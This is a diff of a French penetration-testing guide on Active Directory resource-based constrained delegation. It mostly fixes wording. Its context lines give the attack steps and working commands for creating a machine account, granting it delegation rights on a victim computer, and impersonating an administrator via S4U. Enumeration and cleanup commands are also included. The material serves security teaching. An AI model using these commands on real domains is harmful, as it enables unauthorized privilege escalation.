@@ -20,15 +20,15 @@ Cependant, si le **TGS** utilisé dans **S4U2Proxy** **n'est PAS Transférable**
 
 ### Structure de l'Attaque
 
-> Si vous avez **des privilèges d'écriture équivalents** sur un **compte d'ordinateur**, vous pouvez obtenir **un accès privilégié** sur cette machine.
+> Si vous avez **des privilèges d'écriture équivalents** sur un **compte d'ordinateur**, vous pouvez obtenir un **accès privilégié** sur cette machine.
 
 Supposons que l'attaquant a déjà **des privilèges d'écriture équivalents sur l'ordinateur de la victime**.
 
 1. L'attaquant **compromet** un compte qui a un **SPN** ou **en crée un** (“Service A”). Notez que **tout** _Utilisateur Admin_ sans aucun autre privilège spécial peut **créer** jusqu'à 10 objets d'ordinateur (**_MachineAccountQuota_**) et leur attribuer un **SPN**. Donc, l'attaquant peut simplement créer un objet d'ordinateur et définir un SPN.
 2. L'attaquant **abuse de son privilège d'ÉCRITURE** sur l'ordinateur de la victime (ServiceB) pour configurer **la délégation contraignante basée sur les ressources pour permettre à ServiceA d'imposer n'importe quel utilisateur** contre cet ordinateur de la victime (ServiceB).
 3. L'attaquant utilise Rubeus pour effectuer une **attaque S4U complète** (S4U2Self et S4U2Proxy) de Service A à Service B pour un utilisateur **avec un accès privilégié à Service B**.
-1. S4U2Self (depuis le compte SPN compromis/créé) : Demander un **TGS d'Administrateur pour moi** (Non Transférable).
-2. S4U2Proxy : Utiliser le **TGS non Transférable** de l'étape précédente pour demander un **TGS** de **l'Administrateur** au **hôte victime**.
+1. S4U2Self (depuis le compte SPN compromis/créé) : Demande un **TGS d'Administrateur pour moi** (Non Transférable).
+2. S4U2Proxy : Utilise le **TGS non Transférable** de l'étape précédente pour demander un **TGS** de **l'Administrateur** au **hôte victime**.
 3. Même si vous utilisez un TGS non Transférable, comme vous exploitez la délégation contraignante basée sur les ressources, cela fonctionnera.
 4. L'attaquant peut **passer le ticket** et **imposer** l'utilisateur pour obtenir **l'accès au ServiceB de la victime**.
 
@@ -48,14 +48,14 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
-### Configurer la délégation contrainte basée sur les ressources
+### Configuration de la délégation contrainte basée sur les ressources
 
 **Utilisation du module PowerShell activedirectory**
 ```bash
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
-**Utilisation de powerview**
+**Utiliser powerview**
 ```bash
 $ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
@@ -127,7 +127,7 @@ Apprenez-en plus sur les [**tickets de service disponibles ici**](silver-ticket.
 
 ### Énumérer les ordinateurs avec RBCD configuré
 
-PowerShell (décodage du SD pour résoudre les SID) :
+PowerShell (décodage du SD pour résoudre les SIDs) :
 ```powershell
 # List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
 Import-Module ActiveDirectory
@@ -156,7 +156,7 @@ Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
 # Or using the friendly property
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
 ```
-- Impacket:
+- Impacket :
 ```bash
 # Remove a specific principal from the SD
 impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
